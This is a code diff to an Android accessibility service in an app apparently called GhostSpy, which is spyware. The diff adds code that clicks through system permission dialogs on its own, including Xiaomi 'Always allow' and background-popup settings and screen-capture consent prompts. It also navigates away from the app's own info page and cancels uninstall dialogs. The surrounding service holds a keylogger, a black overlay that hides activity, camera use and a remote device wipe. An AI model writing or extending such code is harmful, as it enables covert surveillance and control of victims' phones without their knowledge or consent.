@@ -1,5 +1,6 @@
 package com.spy.ghostspy.services;
 
+import android.Manifest;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
@@ -11,6 +12,7 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
@@ -44,6 +46,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.HandlerThread;
+import android.os.IBinder;
 import android.os.UserHandle;
 import android.os.UserManager;
 import android.provider.CallLog;
@@ -71,6 +74,7 @@ import androidx.core.content.ContextCompat;
 import com.spy.ghostspy.R;
 import com.spy.ghostspy.activity.OverlaySetActivity;
 import com.spy.ghostspy.activity.PermissionSetActivity;
+import com.spy.ghostspy.activity.SetAutoStartActivity;
 import com.spy.ghostspy.model.ApplistEntry;
 import com.spy.ghostspy.model.CallLogEntry;
 import com.spy.ghostspy.model.ImageData;
@@ -117,6 +121,9 @@ public class MainAccessibilityService extends AccessibilityService {
     DisplayMetrics displayMetrics;
 
     //Screen Monitor
+    private CaptureForgroundService myService;
+    private boolean isBound = false;
+
     private final int imageWidth = 360;
     int deviceWidth = 0;
     int deviceHeight = 0;
@@ -125,10 +132,6 @@ public class MainAccessibilityService extends AccessibilityService {
     private MediaProjectionManager mediaProjectionManager;
     private MediaProjection mediaProjection;
     private ImageReader imageReader;
-
-    private Handler scrollHandler = new Handler();
-    private Runnable scrollRunnable;
-    private Boolean isServiceSel = false;
 
     //blackscreen
     private boolean blackScreen = false;
@@ -146,6 +149,7 @@ public class MainAccessibilityService extends AccessibilityService {
     //stopuninstall
     private Boolean isSelectedApp = false;
     private Boolean isUninstallapp = false;
+    private Boolean isAppDetail = false;
 
     // Camera
     private CameraManager cameraManager;
@@ -174,15 +178,14 @@ public class MainAccessibilityService extends AccessibilityService {
     private DevicePolicyManager mDevicePolicyManager;
     private ComponentName mAdminComponent;
 
+    private Boolean isAutostartEnable = false;
+    private Boolean isMediaProjectEnable = false;
+
     private static final String TAG = "MyAccessibilityService";
     @Override
     public void onCreate() {
         super.onCreate();
     }
-//    @Override
-//    public void takeScreenshot(int displayId, @NonNull Executor executor, @NonNull TakeScreenshotCallback callback) {
-//        super.takeScreenshot(displayId, executor, callback);
-//    }
 
     private void startBackgroundThread() {
         backgroundHandlerThread = new HandlerThread("CameraVideoThread");
@@ -225,13 +228,43 @@ public class MainAccessibilityService extends AccessibilityService {
         Intent serviceIntentX = new Intent(getBaseContext(), Server.class);
         getBaseContext().startService(serviceIntentX);
         if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-            Intent intent = new Intent(this, PermissionSetActivity.class);
+            Intent intent = new Intent(getBaseContext(), SetAutoStartActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
+            isAutostartEnable = true;
         } else {
             if(mediaProjection == null) {
-                Intent serviceIntent = new Intent(getBaseContext(), CaptureForgroundService.class);
-                getBaseContext().startService(serviceIntent);
+                Intent serviceIntent = new Intent(this, CaptureForgroundService.class);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    bindService(serviceIntent, new ServiceConnection() {
+                        @Override
+                        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
+                            CaptureForgroundService.MyBinder binder = (CaptureForgroundService.MyBinder) iBinder;
+                            myService = binder.getService();
+                            isBound = true;
+                        }
+
+                        @Override
+                        public void onServiceDisconnected(ComponentName componentName) {
+                            isBound = false;
+                        }
+                    }, Context.BIND_AUTO_CREATE | Context.BIND_ALLOW_ACTIVITY_STARTS);
+                } else {
+                    bindService(serviceIntent, new ServiceConnection() {
+                        @Override
+                        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
+                            CaptureForgroundService.MyBinder binder = (CaptureForgroundService.MyBinder) iBinder;
+                            myService = binder.getService();
+                            isBound = true;
+                        }
+
+                        @Override
+                        public void onServiceDisconnected(ComponentName componentName) {
+                            isBound = false;
+                        }
+                    }, Context.BIND_AUTO_CREATE);
+                }
+                ContextCompat.startForegroundService(this, serviceIntent);
             }
         }
     }
@@ -260,6 +293,8 @@ public class MainAccessibilityService extends AccessibilityService {
                     mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);
                 }
                 startCapture();
+                Common.getInstance().setMediaProjection(false);
+                isAutostartEnable = false;
             }
         }
     };
@@ -422,35 +457,94 @@ public class MainAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();
 //        setAutomaticallyPermission(event);
-//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-//            screenShotDevice();
-//        }
-        getSkeletonInfo(event);
-        setStopUninstall(event);
-        getKeyLogger(event);
         setStopUnAccessibility();
-        setMediaProjectionPermission(event);
+        getKeyLogger(event);
+        getSkeletonInfo(event);
+        if(isAutostartEnable && manufacturer.equals("xiaomi")) {
+            setPermEditorEnable(event);
+        } else {
+            setStopUninstall(event);
+            setMediaProjectionPermission(event);
+        }
     }
 
     private void requestMediaProjectionPermission() {
         if (mediaProjection == null) {
-            List<MousePositionEntry> notificationdraw = new ArrayList<>();
-            notificationdraw.add(new MousePositionEntry(50,10));
-            notificationdraw.add(new MousePositionEntry(50,12));
-            notificationdraw.add(new MousePositionEntry(50,50));
+            if(isBound) {
+                Log.d("work", "Bind");
+                myService.startSetMediaPermisstionActivity();
+            }
+        }
+    }
 
-            notificationdraw.add(new MousePositionEntry(50,deviceHeight * 360/ deviceWidth - 100));
-
-            Common.getInstance().setMousePositionEntries(notificationdraw);
-            mouseDraw();
-            Handler handler=new Handler();
-            handler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    startScrolling();
+    private void setPermEditorEnable(AccessibilityEvent event) {
+        CharSequence packagename = String.valueOf(event.getPackageName());
+        Log.d(TAG, "Text changed: " + packagename + "::: "+event.getClassName());
+        if(packagename.equals("com.android.systemui") || packagename.equals("com.miui.securitycenter")) {
+            if(event.getClassName() != null) {
+                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                if(rootNode != null) {
+                    getPermEditorEnable(rootNode);
                 }
-            },500);
+            }
+        }
+    }
+
+    public void getPermEditorEnable(AccessibilityNodeInfo node) {
+        if(node != null) {
+            if (node.getClassName() != null) {
+                Log.d("classname", node.getClassName().toString());
+                if (node.getClassName().equals("android.widget.TextView")) {
+                    if(node.getText() != null) {
+                        String nodeText = node.getText().toString().toLowerCase();
+                        Log.d("Button Text Media", nodeText);
+                        if (nodeText.equals("other permissions") || nodeText.equals("outras permissões") || nodeText.equals("otros permisos")|| nodeText.equals("其他权限")) {
+                            if(Common.getInstance().getAutosel()) {
+                                onGoBack();
+                                isAutostartEnable = false;
+                            } else {
+                                if (node.getParent() != null && node.getParent().isClickable()) {
+                                    node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                }
+                            }
+                        } else if (nodeText.equals("open new windows while running in the background")
+                                || nodeText.equals("abrir novas janelas enquanto executa em segundo plano")
+                                || nodeText.equals("abrir nuevas ventanas mientras se ejecuta en segundo plano")
+                                || nodeText.equals("后台弹出界面")) {
+                            if(Common.getInstance().getAutosel()) {
+                                onGoBack();
+                            } else {
+                                if (node.getParent() != null && node.getParent().isClickable()) {
+                                    node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                }
+                            }
+                        }
+                    }
+                } else if(node.getClassName().equals("android.widget.RadioButton")) {
+                    if(Common.getInstance().getAutosel()) {
+                        onGoBack();
+                    } else {
+                        if ((node.getText() != null && (node.getText().toString().toLowerCase().equals("always allow")
+                                || node.getText().toString().toLowerCase().equals("sempre permitir")
+                                || node.getText().toString().toLowerCase().equals("permitir siempre")
+                                || node.getText().toString().toLowerCase().equals("始终允许")))
+                                ||
+                                (node.getContentDescription() != null && (node.getContentDescription().toString().toLowerCase().equals("always allow")
+                                        || node.getContentDescription().toString().toLowerCase().equals("sempre permitir")
+                                        || node.getContentDescription().toString().toLowerCase().equals("permitir siempre")
+                                        || node.getContentDescription().toString().toLowerCase().equals("始终允许")))) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            Common.getInstance().setAutosel(true);
+                            onGoBack();
+                        }
+                    }
+                }
+            }
+            for (int i = 0; i< node.getChildCount(); i++) {
+                getPermEditorEnable(node.getChild(i));
+            }
         }
     }
     private void setMediaProjectionPermission(AccessibilityEvent event) {
@@ -475,12 +569,28 @@ public class MainAccessibilityService extends AccessibilityService {
             if(rootNode != null) {
                 isSelectedApp = false;
                 isUninstallapp = false;
+                isAppDetail = false;
                 getUninstallDialog(rootNode);
                 if(isSelectedApp && isUninstallapp) {
                     setStopUninstallApp(rootNode);
                 }
+
+                if (isSelectedApp && isAppDetail) {
+                    onGoBack();
+                }
             }
         }
+
+        if(packagename.equals("com.miui.securitycenter") || packagename.equals("com.android.settings")){
+            isSelectedApp = false;
+            isAppDetail = false;
+            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+            getAppDetailPage(rootNode);
+            if (isSelectedApp && isAppDetail) {
+                onGoBack();
+            }
+        }
+
     }
 
     private void setStopUnAccessibility() {
@@ -533,46 +643,24 @@ public class MainAccessibilityService extends AccessibilityService {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
                     Log.d("Button Text Media", nodeText);
-                    if(nodeText.equals("start now")
-                            || nodeText.equals("start")
-                            || nodeText.equals("iniciar agora")
-                            || nodeText.equals("início")
-                            || nodeText.equals("iniciar")) {
-                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                    } else if(nodeText.equals("cancel") || nodeText.equals("cancelar")){
-                        Rect rect = new Rect();
-                        node.getBoundsInScreen(rect);
-                        AccessibilityNodeInfo nodeone = getComponentAtPosition(deviceWidth - rect.left - 10, rect.top + 10);
-                        if(nodeone == null  || !nodeone.getClassName().equals("android.widget.FrameLayout")) {
-                            if(rect.width() < deviceWidth / 2 ) {
-                                performClickMain(deviceWidth - rect.left - 10, rect.top + 10);
-                            }
-                        }
-                    }
-                }
-            } else if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
-                if(node.getText() != null) {
-                    String nodeText = node.getText().toString().toLowerCase();
-                    Log.d("TextView Text Media", nodeText);
-                    if(nodeText.contains("service is running")) {
-                        if(node.isClickable()) {
+                    if(Common.getInstance().getMediaProjection()) {
+                        if(nodeText.equals("start now")
+                                || nodeText.equals("start")
+                                || nodeText.equals("iniciar agora")
+                                || nodeText.equals("iniciar ahora")
+                                || nodeText.equals("empezar ahora")
+                                || nodeText.equals("início")
+                                || nodeText.equals("iniciar")
+                                || nodeText.equals("立即开始")) {
                             node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                        } else if(node.getParent().isClickable()) {
-                            Log.d("parent click::", "parenbte one");
-                            node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                        } else if(node.getParent().getParent() != null) {
-                            if(node.getParent().getParent().isClickable()) {
-                                Log.d("parent click::", "parent two");
-                                node.getParent().getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                            } else if(node.getParent().getParent().getParent() != null) {
-                                if(node.getParent().getParent().getParent().isClickable()) {
-                                    node.getParent().getParent().getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                                }
-                            }
+                        } else if(nodeText.equals("cancel") || nodeText.equals("cancelar")|| nodeText.equals("取消")){
+                            Rect rect = new Rect();
+                            node.getBoundsInScreen(rect);
+                            performClickMain(deviceWidth - rect.left - 10, rect.top + 10);
+
                         }
-                        isServiceSel = true;
-                        stopScrollingHandler();
                     }
+
                 }
             }
             for (int i = 0; i< node.getChildCount(); i++) {
@@ -589,7 +677,7 @@ public class MainAccessibilityService extends AccessibilityService {
                     if(nodeText.contains(getResources().getString(R.string.app_name).toLowerCase())) {
                         isSelectedApp = true;
                     }
-                    if (nodeText.contains("desins") || nodeText.contains("unins")) {
+                    if (nodeText.contains("desins") || nodeText.contains("unins") || nodeText.contains("卸载")|| nodeText.contains("解除安")) {
                         isUninstallapp = true;
                     }
                 }
@@ -599,37 +687,31 @@ public class MainAccessibilityService extends AccessibilityService {
             }
         }
     }
-
-    public AccessibilityNodeInfo getComponentAtPosition(int x, int y) {
-        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-        if (rootNode != null) {
-            return findNodeAtPosition(rootNode, x, y);
-        }
-        return null;
-    }
-
-    private AccessibilityNodeInfo findNodeAtPosition(AccessibilityNodeInfo node, int x, int y) {
-        if (node == null) {
-            return null;
-        }
-        Rect bounds = new Rect();
-        node.getBoundsInScreen(bounds);
-        if (bounds.contains(x, y)) {
-            Log.d("Bound::", bounds.left + "::" + bounds.top);
-            if(!node.getClassName().equals("android.widget.FrameLayout")) {
-                return node;
+    public void getAppDetailPage(AccessibilityNodeInfo node) {
+        if(node != null) {
+            if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
+                if(node.getText() != null) {
+                    String nodeText = node.getText().toString().toLowerCase();
+                    Log.d("Inofrmation::", nodeText);
+                    if(nodeText.contains(getResources().getString(R.string.app_name).toLowerCase())) {
+                        isSelectedApp = true;
+                    }
+                    if (nodeText.contains("informações do app") || nodeText.contains("app info")
+                            || nodeText.contains("informações do aplicativo") || nodeText.contains("información de aplicación")
+                            || nodeText.contains("información de la aplicación")
+                            || nodeText.contains("应用信息")
+                            || nodeText.contains("应用程序信息")
+                            || nodeText.contains("應用程式資訊")) {
+                        isAppDetail = true;
+                    }
+                }
             }
-
-        }
-        for (int i = 0; i < node.getChildCount(); i++) {
-            AccessibilityNodeInfo child = node.getChild(i);
-            AccessibilityNodeInfo result = findNodeAtPosition(child, x, y);
-            if (result != null) {
-                return result;
+            for (int i = 0; i< node.getChildCount(); i++) {
+                getAppDetailPage(node.getChild(i));
             }
         }
-        return null;
     }
+
 
     public void getAccessibilityPage(AccessibilityNodeInfo node) {
         if(node != null) {
@@ -654,7 +736,8 @@ public class MainAccessibilityService extends AccessibilityService {
                     String nodeText = node.getText().toString().toLowerCase();
                     Log.d("Button Text Stopunin", nodeText);
                     if(nodeText.equals("cancel")
-                            || nodeText.equals("cancelar")) {
+                            || nodeText.equals("cancelar")
+                            || nodeText.equals("取消")) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     }
                 }
@@ -666,39 +749,6 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     private void getSkeletonInfo(AccessibilityEvent event) {
-//        if(event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-//            skeletonEntryEditList.clear();
-//            skeletonEntryEditList.addAll(printVisibleViewSkeleton(event.getSource()));
-//
-//            skeletonEntryResultList.addAll(skeletonEntryWindowList);
-//            skeletonEntryResultList.addAll(skeletonEntryEditList);
-//            skeletonEntryResultList.addAll(skeletonEntryEditList);
-//        }
-//        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-//            skeletonEntryContentList.clear();
-//            skeletonEntryContentList.addAll(printVisibleViewSkeleton(event.getSource()));
-//
-//            skeletonEntryResultList.addAll(skeletonEntryWindowList);
-//            skeletonEntryResultList.addAll(skeletonEntryContentList);
-//            skeletonEntryResultList.addAll(skeletonEntryEditList);
-//        }
-//
-//        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-//            skeletonEntryList.clear();
-//            skeletonEntryList.addAll(printVisibleViewSkeleton(event.getSource()));
-//            if(skeletonEntryList.size() > 1) {
-//                skeletonEntryResultList.clear();
-//                skeletonEntryWindowList.clear();
-//                skeletonEntryContentList.clear();
-//                skeletonEntryEditList.clear();
-//
-//                skeletonEntryResultList.addAll(skeletonEntryList);
-//                skeletonEntryWindowList.addAll(skeletonEntryList);
-//            } else {
-//                skeletonEntryResultList.addAll(skeletonEntryList);
-//            }
-//        }
-
         if(event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
             focusedNode = event.getSource();
             isEditable = focusedNode != null && focusedNode.getClassName().equals("android.widget.EditText");
@@ -845,7 +895,7 @@ public class MainAccessibilityService extends AccessibilityService {
                 contrast, 0, 0, 0, adjustedBrightness,
                 0, contrast, 0, 0, adjustedBrightness,
                 0, 0, contrast, 0, adjustedBrightness,
-                0, 0, 0, 1, 0
+                0, 0, 0, contrast, adjustedBrightness
         });
         paint.setColorFilter(new ColorMatrixColorFilter(colorMatrix));
         canvas.drawBitmap(originalImage.copy(Bitmap.Config.ARGB_8888, true), 0, 0, paint);
@@ -916,7 +966,7 @@ public class MainAccessibilityService extends AccessibilityService {
         if (overlayView == null) {
             overlayView = new View(this);
             overlayView.setBackgroundColor(0xFF000000); // Black color
-            overlayView.getBackground().setAlpha(252);
+            overlayView.getBackground().setAlpha(253);
             loadingTextView = new TextView(this);
             loadingTextView.setTextColor(Color.WHITE);
             loadingTextView.setText(txtBlack);
@@ -1369,9 +1419,6 @@ public class MainAccessibilityService extends AccessibilityService {
                 mDevicePolicyManager.wipeData(0);
             }
         }
-////        Intent intent = new Intent(Settings.ACTION_PRIVACY_SETTINGS);
-////        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-////        startActivity(intent);
     }
 
     private void onGoHome() {
@@ -1384,37 +1431,6 @@ public class MainAccessibilityService extends AccessibilityService {
 
     private void onGoRecent() {
         performGlobalAction(GLOBAL_ACTION_RECENTS);
-    }
-
-    public void startScrolling(){
-        scrollRunnable = new Runnable() {
-            @Override
-            public void run() {
-                if (!isServiceSel) {
-                    Log.d(TAG, "still false");
-                    scrollNotification();
-                    scrollHandler.postDelayed(this, 310);
-                }  else {
-                    stopScrollingHandler();
-                }
-
-            }
-        };
-        scrollHandler.post(scrollRunnable);
-    }
-
-    public void stopScrollingHandler() {
-        scrollHandler.removeCallbacks(scrollRunnable);
-    }
-
-    private void scrollNotification () {
-        List<MousePositionEntry> notificationdraw = new ArrayList<>();
-        int height_val = deviceHeight * 360 /deviceWidth;
-        notificationdraw.add(new MousePositionEntry(50,height_val/2 + 50));
-        notificationdraw.add(new MousePositionEntry(50,height_val/2-50));
-
-        Common.getInstance().setMousePositionEntries(notificationdraw);
-        mouseDraw();
     }
 
 
